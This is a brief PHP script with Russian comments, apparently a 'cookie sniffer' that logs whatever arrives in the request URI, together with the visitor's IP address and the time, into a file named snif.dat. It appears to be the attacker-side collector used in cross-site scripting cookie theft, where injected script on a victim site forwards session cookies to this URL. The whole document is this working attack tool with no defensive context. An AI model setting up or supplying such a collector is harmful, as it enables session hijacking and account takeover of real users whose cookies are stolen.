<?php
 
//получаем данные с ссылки
 
$cookie = $_SERVER['REQUEST_URI'];
 
//ip адрес
 
$ip = $_SERVER['REMOTE_ADDR'];
 
//Создаём файл
 
$file = fopen("snif.dat","a+");
 
//вычисляем текущее время
 
$time = date("H:i:M:d");
 
//добавляем в строковую переменную куки + время + ip
 
$add_text = "$ip $time $cookie";
 
//записываем данные в файл
 
fputs($file,$add_text.",\r\n");
 
//закрываем файл
 
fclose($file);
 
 
?>
